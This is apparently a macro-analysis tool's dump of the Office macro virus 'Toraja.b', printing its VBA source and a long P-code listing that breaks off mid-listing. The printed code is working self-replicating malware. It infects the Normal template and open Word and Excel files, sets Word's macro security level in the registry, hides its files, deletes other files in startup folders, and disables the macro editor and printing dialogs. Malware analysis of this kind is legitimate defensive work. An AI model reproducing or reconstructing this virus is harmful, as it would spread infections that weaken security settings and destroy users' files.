    VBCompAD.DeleteLines 1, VBCompAD.CountOfLines
    For i = 1 To VBCompNT.CountOfLines
         sLine = VBCompNT.Lines(i, 1)
        If Left(sLine, 1) = "'" Then VBCompAD.InsertLines i, Right(sLine, Len(sLine) - 1) Else VBCompAD.InsertLines i, "'" & sLine
    Next i
End If
Salah:
End Sub
'Function CheckComp(Tujuan)
'Dim i, x, VBComp
'Dim sLine As String: Dim blnM As Boolean
'Const mName = "Toraja01"
'blnM = False
'For Each VBComp In Tujuan.VBProject.VBComponents
'   If VBComp.Name <> "ThisDocument" And VBComp.Name <> "Reference To Normal" Then
'        If VBComp.Name = mName Then If Tujuan.VBProject.VBComponents(mName).CodeModule.CountOfLines = _
'           ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines - 1 Then _
'            blnM = True Else GoSub RemoveKomp Else GoSub RemoveKomp
'   End If
'Next VBComp
'If blnM = False Then
'x = Tujuan.VBProject.VBComponents.Count
'Tujuan.VBProject.VBComponents.Add 1
'Tujuan.VBProject.VBComponents(x + 1).Name = mName
'Set VBComp = Tujuan.VBProject.VBComponents(mName).CodeModule
'For i = 1 To ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
'     sLine = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.Lines(i, 1)
'     If Left(sLine, 1) = "'" Then VBComp.InsertLines i, Right(sLine, Len(sLine) - 1) Else VBComp.InsertLines i, "'" & sLine
'Next i
'If Len(Tujuan.Path) <> 0 Then Tujuan.Save
'End If
'Salah:
'Exit Function
'RemoveKomp:
'Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(VBComp.Name): Return
'End Function
'Sub AutoClose()
'On Error Resume Next
'CheckComp NormalTemplate
'CheckComp ActiveDocument
'Application.Run "RemoveAll"
'End Sub
'

'

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSOffice.Toraja.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 30966 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0029 "Rem Created       : Toraja High Land 1998"
' Line #1:
' 	QuoteRem 0x0000 0x001D "Rem Modified      : July 1999"
' Line #2:
' 	QuoteRem 0x0000 0x0042 "Rem --------------------------------------------------------------"
' Line #3:
' 	QuoteRem 0x0000 0x000F "Option Explicit"
' Line #4:
' 	QuoteRem 0x0000 0x0013 "Option Compare Text"
' Line #5:
' 	QuoteRem 0x0000 0x0018 "Dim Komp As Variant, ctl"
' Line #6:
' 	QuoteRem 0x0000 0x00B1 "Public Const regApp As String = "Application": Public Const regSecSet As String = "Settings": Public Const TempName As String = "Tana": Public Const MacName As String = "Toraja""
' Line #7:
' 	QuoteRem 0x0000 0x0068 "Public Const fStartUp As String = "AutoStart": Public Const Ver As String = "01": Dim CusProp, actWindow"
' Line #8:
' 	QuoteRem 0x0000 0x0063 "Global Active, Temp, tempPath, AllActive, blnFound As Boolean, blnXls As Boolean, blnMod As Boolean"
' Line #9:
' 	QuoteRem 0x0000 0x000E "Sub Register()"
' Line #10:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #11:
' 	QuoteRem 0x0000 0x0081 "If GetSetting(regApp, regSecSet, "FirstRun") = "" Then SaveSetting regApp, regSecSet, "FirstRun", Format(Date + 30, "dd-mm-yyyy")"
' Line #12:
' 	QuoteRem 0x0000 0x0076 "If GetSetting(regApp, regSecSet, "UserKeyWord") <> Ver & MacName Then SaveSetting regApp, regSecSet, "UserKeyWord", """
' Line #13:
' 	QuoteRem 0x0000 0x0075 "If GetSetting(regApp, regSecSet, "AuthorKeyWord") <> "Marsel" Then SaveSetting regApp, regSecSet, "AuthorKeyWord", """
' Line #14:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #15:
' 	QuoteRem 0x0000 0x001C "Function Serang() As Boolean"
' Line #16:
' 	QuoteRem 0x0000 0x0013 "Dim getDate As Date"
' Line #17:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #18:
' 	QuoteRem 0x0000 0x0033 "getDate = GetSetting(regApp, regSecSet, "FirstRun")"
' Line #19:
' 	QuoteRem 0x0000 0x0070 "If Format(getDate, "dd-mm-yyyy") <= Format(Date, "dd-mm-yyyy") Then MsgBox "This command not available now.", 48"
' Line #20:
' 	QuoteRem 0x0000 0x000C "End Function"
' Line #21:
' 	QuoteRem 0x0000 0x000E "Sub AutoExec()"
' Line #22:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #23:
' 	QuoteRem 0x0000 0x001F "Application.EnableCancelKey = 0"
' Line #24:
' 	QuoteRem 0x0000 0x003E "RemStartUp Application.StartupPath & Application.PathSeparator"
' Line #25:
' 	QuoteRem 0x0000 0x0031 "If MacroContainer <> fStartUp & Ver & ".dot" Then"
' Line #26:
' 	QuoteRem 0x0000 0x0071 "    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 3"
' Line #27:
' 	QuoteRem 0x0000 0x002A "    Application.DisplayRecentFiles = False"
' Line #28:
' 	QuoteRem 0x0000 0x000C "    MenuWord"
' Line #29:
' 	QuoteRem 0x0000 0x000C "    Register"
' Line #30:
' 	QuoteRem 0x0000 0x0004 "Else"
' Line #31:
' 	QuoteRem 0x0000 0x003E "    KompProject fStartUp & Ver & ".dot", NormalTemplate, False"
' Line #32:
' 	QuoteRem 0x0000 0x001A "    If blnMod = False Then"
' Line #33:
' 	QuoteRem 0x0000 0x009A "        Application.OrganizerCopy Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dat", NormalTemplate.FullName, MacName & Ver, 3"
' Line #34:
' 	QuoteRem 0x0000 0x001B "        NormalTemplate.Save"
' Line #35:
' 	QuoteRem 0x0000 0x000A "    End If"
' Line #36:
' 	QuoteRem 0x0000 0x0021 "    WordBasic.DisableAutoMacros 1"
' Line #37:
' 	QuoteRem 0x0000 0x0017 "    AddIns.Unload False"
' Line #38:
' 	QuoteRem 0x0000 0x0021 "    WordBasic.DisableAutoMacros 0"
' Line #39:
' 	QuoteRem 0x0000 0x000E "    TempActive"
' Line #40:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #41:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #42:
' 	QuoteRem 0x0000 0x000D "Sub AutoNew()"
' Line #43:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #44:
' 	QuoteRem 0x0000 0x000A "TempActive"
' Line #45:
' 	QuoteRem 0x0000 0x001A "ActiveWindow.View.Type = 3"
' Line #46:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #47:
' 	QuoteRem 0x0000 0x0025 "Function RemStartUp(fPath) As Boolean"
' Line #48:
' 	QuoteRem 0x0000 0x0013 "On Error GoTo Salah"
' Line #49:
' 	QuoteRem 0x0000 0x0030 "blnXls = False: blnFound = False: blnMod = False"
' Line #50:
' 	QuoteRem 0x0000 0x001C "If Dir(fPath, 16) <> "" Then"
' Line #51:
' 	QuoteRem 0x0000 0x0020 "  Komp = Dir(fPath, 0 Or 1 Or 2)"
' Line #52:
' 	QuoteRem 0x0000 0x0015 "  Do While Komp <> """
' Line #53:
' 	QuoteRem 0x0000 0x0051 "    If Komp = fStartUp & Ver & ".dot" Then blnMod = True: SetAttr fPath & Komp, 1"
' Line #54:
' 	QuoteRem 0x0000 0x0057 "    If Komp = fStartUp & Ver & ".dat" Then blnFound = True: SetAttr fPath & Komp, 1 + 2"
' Line #55:
' 	QuoteRem 0x0000 0x0051 "    If Komp = fStartUp & Ver & ".XLS" Then blnXls = True: SetAttr fPath & Komp, 1"
' Line #56:
' 	LineCont 0x0008 01 00 91 FF 01 00 30 FF
' 	QuoteRem 0x0000 0x0109 "    If Komp <> "." And Komp <> ".." And Komp <> fStartUp & Ver & ".dot" And Komp <> fStartUp & Ver & ".dat" And'       Komp <> "MSCREATE.DIR" And Left(Komp, 2) <> "~$" And Komp <> fStartUp & Ver & ".XLS" Then'       SetAttr fPath & Komp, vbNormal: Kill fPath & Komp"
' Line #57:
' 	QuoteRem 0x0000 0x0010 "      Komp = Dir"
' Line #58:
' 	QuoteRem 0x0000 0x0006 "  Loop"
' Line #59:
' 	QuoteRem 0x0000 0x003D "  If blnMod = True And blnFound = True Then RemStartUp = True"
' Line #60:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #61:
' 	QuoteRem 0x0000 0x000D "Exit Function"
' Line #62:
' 	QuoteRem 0x0000 0x0006 "Salah:"
' Line #63:
' 	QuoteRem 0x0000 0x000B "Resume Next"
' Line #64:
' 	QuoteRem 0x0000 0x000C "End Function"
' Line #65:
' 	QuoteRem 0x0000 0x000E "Sub AutoOpen()"
' Line #66:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #67:
' 	QuoteRem 0x0000 0x0014 "Dim strRun As String"
' Line #68:
' 	QuoteRem 0x0000 0x000A "ActiveTemp"
' Line #69:
' 	QuoteRem 0x0000 0x0009 "RemoveAll"
' Line #70:
' 	QuoteRem 0x0000 0x0008 "MenuWord"
' Line #71:
' 	QuoteRem 0x0000 0x0008 "Register"
' Line #72:
' 	QuoteRem 0x0000 0x0017 "If blnFound = True Then"
' Line #73:
' 	QuoteRem 0x0000 0x003D "   strRun = TempName & Ver & "." & MacName & Ver & ".FoundIt""
' Line #74:
' 	QuoteRem 0x0000 0x0039 "   Application.OnTime Now + TimeValue("00:01:00"), strRun"
' Line #75:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #76:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #77:
' 	QuoteRem 0x0000 0x000E "Sub AutoExit()"
' Line #78:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #79:
' 	QuoteRem 0x0000 0x001B "Application.Visible = False"
' Line #80:
' 	QuoteRem 0x0000 0x001D "Application.DisplayAlerts = 0"
' Line #81:
' 	QuoteRem 0x0000 0x0025 "If MacroContainer = "Normal.dot" Then"
' Line #82:
' 	QuoteRem 0x0000 0x000D "    ExportXls"
' Line #83:
' 	QuoteRem 0x0000 0x0053 "    If RemStartUp(Application.StartupPath & Application.PathSeparator) = False Then"
' Line #84:
' 	QuoteRem 0x0000 0x0015 "        Documents.Add"
' Line #85:
' 	QuoteRem 0x0000 0x006E "        ActiveDocument.SaveAs Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dat", 0"
' Line #86:
' 	QuoteRem 0x0000 0x006E "        ActiveDocument.SaveAs Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".dot", 1"
' Line #87:
' 	QuoteRem 0x0000 0x000A "    End If"
' Line #88:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #89:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #90:
' 	QuoteRem 0x0000 0x001D "Function KeyWord() As Boolean"
' Line #91:
' 	QuoteRem 0x0000 0x0053 "If GetSetting(regApp, regSecSet, "UserKeyWord") = Ver & MacName Then KeyWord = True"
' Line #92:
' 	QuoteRem 0x0000 0x000C "End Function"
' Line #93:
' 	QuoteRem 0x0000 0x000E "Sub FileOpen()"
' Line #94:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #95:
' 	QuoteRem 0x0000 0x001D "WordBasic.DisableAutoMacros 1"
' Line #96:
' 	QuoteRem 0x0000 0x0010 "Dialogs(80).Show"
' Line #97:
' 	QuoteRem 0x0000 0x000A "TempActive"
' Line #98:
' 	QuoteRem 0x0000 0x001D "WordBasic.DisableAutoMacros 0"
' Line #99:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #100:
' 	QuoteRem 0x0000 0x0043 "Function KompProject(Asal, Tujuan, blnEIKMod As Boolean) As Boolean"
' Line #101:
' 	QuoteRem 0x0000 0x0013 "On Error GoTo Salah"
' Line #102:
' 	QuoteRem 0x0000 0x000E "blnMod = False"
' Line #103:
' 	QuoteRem 0x0000 0x002E "For Each Komp In Tujuan.VBProject.VBComponents"
' Line #104:
' 	LineCont 0x0004 01 00 B0 FF
' 	QuoteRem 0x0000 0x00C1 "   If (Komp.Name <> "ThisDocument") And (Komp.Name <> "Reference To Normal") And'      (Left(Komp.Name, 5) <> "Sheet") And (Komp.Name <> "ThisWorkbook") And (Left(Komp.Name, 5) <> "Chart") Then"
' Line #105:
' 	LineCont 0x0008 01 00 8D FF 01 00 3A FF
' 	QuoteRem 0x0000 0x010C "        If Komp.Name = MacName & Ver Then If Tujuan.VBProject.VBComponents(MacName & Ver).CodeModule.CountOfLines ='           Asal.VBProject.VBComponents(MacName & Ver).CodeModule.CountOfLines Then'            blnMod = True Else GoSub RemoveKomp Else GoSub RemoveKomp"
' Line #106:
' 	QuoteRem 0x0000 0x0009 "   End If"
' Line #107:
' 	QuoteRem 0x0000 0x0009 "Next Komp"
' Line #108:
' 	QuoteRem 0x0000 0x0077 "If blnEIKMod = True Then If blnMod = False Then If EIKModul(Asal, Tujuan, MacName & Ver) = True Then KompProject = True"
' Line #109:
' 	QuoteRem 0x0000 0x0006 "Salah:"
' Line #110:
' 	QuoteRem 0x0000 0x000D "Exit Function"
' Line #111:
' 	QuoteRem 0x0000 0x000B "RemoveKomp:"
' Line #112:
' 	QuoteRem 0x0000 0x0069 "Tujuan.VBProject.VBComponents.Remove Tujuan.VBProject.VBComponents(Komp.Name): KompProject = True: Return"
' Line #113:
' 	QuoteRem 0x0000 0x000C "End Function"
' Line #114:
' 	QuoteRem 0x0000 0x000F "Sub ThisDocNT()"
' Line #115:
' 	QuoteRem 0x0000 0x000C "Dim VBCompNT"
' Line #116:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #117:
' 	QuoteRem 0x0000 0x004F "Set VBCompNT = NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule"
' Line #118:
' 	QuoteRem 0x0000 0x004F "If VBCompNT.CountOfLines > 0 Then VBCompNT.DeleteLines 1, VBCompNT.CountOfLines"
' Line #119:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #120:
' 	QuoteRem 0x0000 0x001F "Function RemoveAll() As Boolean"
' Line #121:
' 	QuoteRem 0x0000 0x0013 "On Error GoTo Salah"
' Line #122:
' 	QuoteRem 0x0000 0x0008 "Aplikasi"
' Line #123:
' 	QuoteRem 0x0000 0x001F "For Each actWindow In AllActive"
' Line #124:
' 	QuoteRem 0x0000 0x0045 "    If actWindow.Name = fStartUp & Ver & ".XLS" Then RemoveAll = True"
' Line #125:
' 	QuoteRem 0x0000 0x0029 "    If actWindow.Name <> Active.Name Then"
' Line #126:
' 	QuoteRem 0x0000 0x006B "        If KompProject(Active, actWindow, True) = True Then If Len(actWindow.Path) <> 0 Then actWindow.Save"
' Line #127:
' 	QuoteRem 0x0000 0x000A "    End If"
' Line #128:
' 	QuoteRem 0x0000 0x000E "Next actWindow"
' Line #129:
' 	QuoteRem 0x0000 0x0006 "Salah:"
' Line #130:
' 	QuoteRem 0x0000 0x000C "End Function"
' Line #131:
' 	QuoteRem 0x0000 0x001E "Function PrintOke() As Boolean"
' Line #132:
' 	QuoteRem 0x0000 0x0011 "Const CP = "cPrt""
' Line #133:
' 	QuoteRem 0x0000 0x0013 "On Error GoTo Salah"
' Line #134:
' 	QuoteRem 0x0000 0x002B "If KeyWord = True Or GetCreator = True Then"
' Line #135:
' 	QuoteRem 0x0000 0x0013 "    PrintOke = True"
' Line #136:
' 	QuoteRem 0x0000 0x0004 "Else"
' Line #137:
' 	QuoteRem 0x0000 0x0026 "    If CusProp.Item(CP).Value < 2 Then"
' Line #138:
' 	QuoteRem 0x0000 0x003B "        CusProp.Item(CP).Value = CusProp.Item(CP).Value + 1"
' Line #139:
' 	QuoteRem 0x0000 0x009B "        If Val(GetSetting(regApp, regSecSet, CP)) <= 15 Then SaveSetting regApp, regSecSet, CP, Val(GetSetting(regApp, regSecSet, CP)) + 1: PrintOke = True"
' Line #140:
' 	QuoteRem 0x0000 0x000A "    End If"
' Line #141:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #142:
' 	QuoteRem 0x0000 0x0006 "Salah:"
' Line #143:
' 	QuoteRem 0x0000 0x000C "End Function"
' Line #144:
' 	QuoteRem 0x0000 0x000F "Sub FilePrint()"
' Line #145:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #146:
' 	QuoteRem 0x0000 0x0055 "If PrintOke = True Then Dialogs(88).Show Else If Dialogs(88).Display = -1 Then Serang"
' Line #147:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #148:
' 	QuoteRem 0x0000 0x0016 "Sub FilePrintDefault()"
' Line #149:
' 	QuoteRem 0x0000 0x0009 "FilePrint"
' Line #150:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #151:
' 	QuoteRem 0x0000 0x001C "Sub ToolsCustomizeKeyboard()"
' Line #152:
' 	QuoteRem 0x0000 0x0006 "Serang"
' Line #153:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #154:
' 	QuoteRem 0x0000 0x000E "Sub ViewCode()"
' Line #155:
' 	QuoteRem 0x0000 0x0006 "Serang"
' Line #156:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #157:
' 	QuoteRem 0x0000 0x0010 "Sub ViewVbCode()"
' Line #158:
' 	QuoteRem 0x0000 0x0073 "If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Mrs" Then Application.ShowVisualBasicEditor = True Else Serang"
' Line #159:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #160:
' 	QuoteRem 0x0000 0x0014 "Sub ToolsCustomize()"
' Line #161:
' 	QuoteRem 0x0000 0x0006 "Serang"
' Line #162:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #163:
' 	QuoteRem 0x0000 0x0011 "Sub FormatStyle()"
' Line #164:
' 	QuoteRem 0x0000 0x0034 "If KeyWord = True Then Dialogs(180).Show Else Serang"
' Line #165:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #166:
' 	QuoteRem 0x0000 0x001C "Sub ToolsRecordMacroToggle()"
' Line #167:
' 	QuoteRem 0x0000 0x0006 "Serang"
' Line #168:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #169:
' 	QuoteRem 0x0000 0x0010 "Sub ToolsMacro()"
' Line #170:
' 	QuoteRem 0x0000 0x0006 "Serang"
' Line #171:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #172:
' 	QuoteRem 0x0000 0x0013 "Sub FileTemplates()"
' Line #173:
' 	QuoteRem 0x0000 0x0006 "Serang"
' Line #174:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #175:
' 	QuoteRem 0x0000 0x0017 "Private Sub ExportXls()"
' Line #176:
' 	QuoteRem 0x0000 0x000A "Dim xlsApp"
' Line #177:
' 	QuoteRem 0x0000 0x0015 "Dim strFile As String"
' Line #178:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #179:
' 	QuoteRem 0x0000 0x002D "Set xlsApp = GetObject(, "Excel.Application")"
' Line #180:
' 	QuoteRem 0x0000 0x0019 "If xlsApp Is Nothing Then"
' Line #181:
' 	QuoteRem 0x0000 0x0032 "    Set xlsApp = CreateObject("Excel.Application")"
' Line #182:
' 	QuoteRem 0x0000 0x004B "    If Not xlsApp Is Nothing Then GoSub CheckXls:   xlsApp.Application.Quit"
' Line #183:
' 	QuoteRem 0x0000 0x0004 "Else"
' Line #184:
' 	QuoteRem 0x0000 0x0012 "    GoSub CheckXls"
' Line #185:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #186:
' 	QuoteRem 0x0000 0x0008 "Exit Sub"
' Line #187:
' 	QuoteRem 0x0000 0x0009 "CheckXls:"
' Line #188:
' 	QuoteRem 0x0000 0x0039 "     RemStartUp xlsApp.StartupPath & xlsApp.PathSeparator"
' Line #189:
' 	QuoteRem 0x0000 0x001A "    If blnXls = False Then"
' Line #190:
' 	QuoteRem 0x0000 0x001C "        xlsApp.Workbooks.Add"
' Line #191:
' 	QuoteRem 0x0000 0x0055 "        strFile = xlsApp.StartupPath & xlsApp.PathSeparator & fStartUp & Ver & ".XLS""
' Line #192:
' 	QuoteRem 0x0000 0x002C "        xlsApp.ActiveWorkbook.SaveAs strFile"
' Line #193:
' 	QuoteRem 0x0000 0x004E "        tempPath = Application.NormalTemplate.Path & Application.PathSeparator"
' Line #194:
' 	QuoteRem 0x0000 0x0059 "        EIKModul NormalTemplate, xlsApp.Workbooks(fStartUp & Ver & ".XLS"), MacName & Ver"
' Line #195:
' 	QuoteRem 0x0000 0x0051 "        xlsApp.Workbooks(fStartUp & Ver & ".XLS").VBProject.Name = TempName & Ver"
' Line #196:
' 	QuoteRem 0x0000 0x002B "        xlsApp.ActiveWindow.Visible = False"
' Line #197:
' 	QuoteRem 0x0000 0x0036 "        xlsApp.Workbooks(fStartUp & Ver & ".XLS").Save"
' Line #198:
' 	QuoteRem 0x0000 0x000A "    End If"
' Line #199:
' 	QuoteRem 0x0000 0x0006 "Return"
' Line #200:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #201:
' 	QuoteRem 0x0000 0x000F "Sub ExportDok()"
' Line #202:
' 	QuoteRem 0x0000 0x000A "Dim dokApp"
' Line #203:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #204:
' 	QuoteRem 0x0000 0x002C "Set dokApp = GetObject(, "Word.Application")"
' Line #205:
' 	QuoteRem 0x0000 0x0019 "If dokApp Is Nothing Then"
' Line #206:
' 	QuoteRem 0x0000 0x0031 "    Set dokApp = CreateObject("Word.Application")"
' Line #207:
' 	QuoteRem 0x0000 0x004E "    If Not dokApp Is Nothing Then GoSub CheckDoc: dokApp.Application.Quit True"
' Line #208:
' 	QuoteRem 0x0000 0x0004 "Else"
' Line #209:
' 	QuoteRem 0x0000 0x0012 "    GoSub CheckDoc"
' Line #210:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #211:
' 	QuoteRem 0x0000 0x0008 "Exit Sub"
' Line #212:
' 	QuoteRem 0x0000 0x0009 "CheckDoc:"
' Line #213:
' 	QuoteRem 0x0000 0x0024 "tempPath = Application.TemplatesPath"
' Line #214:
' 	QuoteRem 0x0000 0x004B "KompProject Workbooks(fStartUp & Ver & ".XLS"), dokApp.NormalTemplate, True"
' Line #215:
' 	QuoteRem 0x0000 0x0034 "RemStartUp dokApp.StartupPath & dokApp.PathSeparator"
' Line #216:
' 	QuoteRem 0x0000 0x0006 "Return"
' Line #217:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #218:
' 	QuoteRem 0x0000 0x000F "Sub Auto_Open()"
' Line #219:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #220:
' 	QuoteRem 0x0000 0x001F "Application.EnableCancelKey = 0"
' Line #221:
' 	QuoteRem 0x0000 0x0027 "If RemoveAll = False Then BuatXlsActive"
' Line #222:
' 	QuoteRem 0x0000 0x003E "RemStartUp Application.StartupPath & Application.PathSeparator"
' Line #223:
' 	QuoteRem 0x0000 0x0009 "XlsActive"
' Line #224:
' 	QuoteRem 0x0000 0x003F "If ActiveWorkbook.Name = fStartUp & Ver & ".XLS" Then ExportDok"
' Line #225:
' 	QuoteRem 0x0000 0x0008 "Register"
' Line #226:
' 	QuoteRem 0x0000 0x0026 "Application.DisplayRecentFiles = False"
' Line #227:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #228:
' 	QuoteRem 0x0000 0x000F "Sub XlsActive()"
' Line #229:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #230:
' 	QuoteRem 0x0000 0x0021 "Application.DisplayAlerts = False"
' Line #231:
' 	QuoteRem 0x0000 0x000C "CreateEvents"
' Line #232:
' 	QuoteRem 0x0000 0x000A "TempActive"
' Line #233:
' 	QuoteRem 0x0000 0x005F "Application.OnSheetActivate = "": Application.OnSheetDeactivate = "": Application.OnWindow = """
' Line #234:
' 	QuoteRem 0x0000 0x0009 "MenuExcel"
' Line #235:
' 	QuoteRem 0x0000 0x003D "Application.OnWindow = fStartUp & Ver & ".XLS" & "!XlsActive""
' Line #236:
' 	QuoteRem 0x0000 0x0020 "Application.DisplayAlerts = True"
' Line #237:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #238:
' 	QuoteRem 0x0000 0x0010 "Sub TempActive()"
' Line #239:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #240:
' 	QuoteRem 0x0000 0x0008 "Aplikasi"
' Line #241:
' 	QuoteRem 0x0000 0x002E "If KompProject(Temp, Active, True) = True Then"
' Line #242:
' 	QuoteRem 0x0000 0x000D "   SetCusProp"
' Line #243:
' 	QuoteRem 0x0000 0x0022 "   Active.VBProject.Name = MacName"
' Line #244:
' 	QuoteRem 0x0000 0x002C "   If Len(Active.Path) <> 0 Then Active.Save"
' Line #245:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #246:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #247:
' 	QuoteRem 0x0000 0x003A "Function EIKModul(Asal, Tujuan, Komp As String) As Boolean"
' Line #248:
' 	QuoteRem 0x0000 0x0013 "On Error GoTo Salah"
' Line #249:
' 	QuoteRem 0x0000 0x003C "    Asal.VBProject.VBComponents(Komp).Export tempPath & Komp"
' Line #250:
' 	QuoteRem 0x0000 0x0038 "    Tujuan.VBProject.VBComponents.Import tempPath & Komp"
' Line #251:
' 	QuoteRem 0x0000 0x0029 "    EIKModul = True: Kill tempPath & Komp"
' Line #252:
' 	QuoteRem 0x0000 0x0006 "Salah:"
' Line #253:
' 	QuoteRem 0x0000 0x000C "End Function"
' Line #254:
' 	QuoteRem 0x0000 0x000E "Sub OpenFile()"
' Line #255:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #256:
' 	QuoteRem 0x0000 0x0021 "Application.DisplayAlerts = False"
' Line #257:
' 	QuoteRem 0x0000 0x001B "Application.Dialogs(1).Show"
' Line #258:
' 	QuoteRem 0x0000 0x0009 "XlsActive"
' Line #259:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #260:
' 	QuoteRem 0x0000 0x001A "Private Sub CreateEvents()"
' Line #261:
' 	QuoteRem 0x0000 0x000A "Dim VBComp"
' Line #262:
' 	QuoteRem 0x0000 0x0013 "On Error GoTo Salah"
' Line #263:
' 	QuoteRem 0x0000 0x0007 "Lanjut:"
' Line #264:
' 	QuoteRem 0x0000 0x0087 "If ActiveWorkbook.CustomDocumentProperties.Item("Event").Value <> MacName & Ver And ActiveWorkbook.Name <> fStartUp & Ver & ".XLS" Then"
' Line #265:
' 	QuoteRem 0x0000 0x0018 "On Error GoTo FatalError"
' Line #266:
' 	QuoteRem 0x0000 0x0051 "    Set VBComp = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule"
' Line #267:
' 	QuoteRem 0x0000 0x000F "    With VBComp"
' Line #268:
' 	QuoteRem 0x0000 0x0070 "            .DeleteLines 1, .CountOfLines: .InsertLines 1, "Private Sub Workbook_BeforePrint(Cancel As Boolean)""
' Line #269:
' 	QuoteRem 0x0000 0x0087 "            .InsertLines 2, "On Error Resume Next": .InsertLines 3, "If PrintOke = False Then Cancel = True": .InsertLines 4, "End Sub""
' Line #270:
' 	QuoteRem 0x0000 0x000C "    End With"
' Line #271:
' 	QuoteRem 0x0000 0x004B "ActiveWorkbook.CustomDocumentProperties.Item("Event").Value = MacName & Ver"
' Line #272:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #273:
' 	QuoteRem 0x0000 0x000B "FatalError:"
' Line #274:
' 	QuoteRem 0x0000 0x0008 "Exit Sub"
' Line #275:
' 	QuoteRem 0x0000 0x0006 "Salah:"
' Line #276:
' 	QuoteRem 0x0000 0x0043 "ActiveWorkbook.CustomDocumentProperties.Add ("Event"), False, 4, """
' Line #277:
' 	QuoteRem 0x0000 0x000D "Resume Lanjut"
' Line #278:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #279:
' 	QuoteRem 0x0000 0x0013 "Sub BuatXlsActive()"
' Line #280:
' 	QuoteRem 0x0000 0x0012 "Dim Baru As String"
' Line #281:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #282:
' 	QuoteRem 0x0000 0x0022 "Application.ScreenUpdating = False"
' Line #283:
' 	QuoteRem 0x0000 0x000D "Workbooks.Add"
' Line #284:
' 	QuoteRem 0x0000 0x0054 "Baru = Application.StartupPath & Application.PathSeparator & fStartUp & Ver & ".XLS""
' Line #285:
' 	QuoteRem 0x0000 0x001A "ActiveWorkbook.SaveAs Baru"
' Line #286:
' 	QuoteRem 0x0000 0x001C "ActiveWindow.Visible = False"
' Line #287:
' 	QuoteRem 0x0000 0x000A "ActiveTemp"
' Line #288:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #289:
' 	QuoteRem 0x0000 0x0010 "Sub ActiveTemp()"
' Line #290:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #291:
' 	QuoteRem 0x0000 0x0008 "Aplikasi"
' Line #292:
' 	QuoteRem 0x0000 0x002E "If KompProject(Active, Temp, True) = True Then"
' Line #293:
' 	QuoteRem 0x0000 0x0027 "   Temp.VBProject.Name = TempName & Ver"
' Line #294:
' 	QuoteRem 0x0000 0x000C "   Temp.Save"
' Line #295:
' 	QuoteRem 0x0000 0x0012 "   blnFound = True"
' Line #296:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #297:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #298:
' 	QuoteRem 0x0000 0x000F "Sub MenuExcel()"
' Line #299:
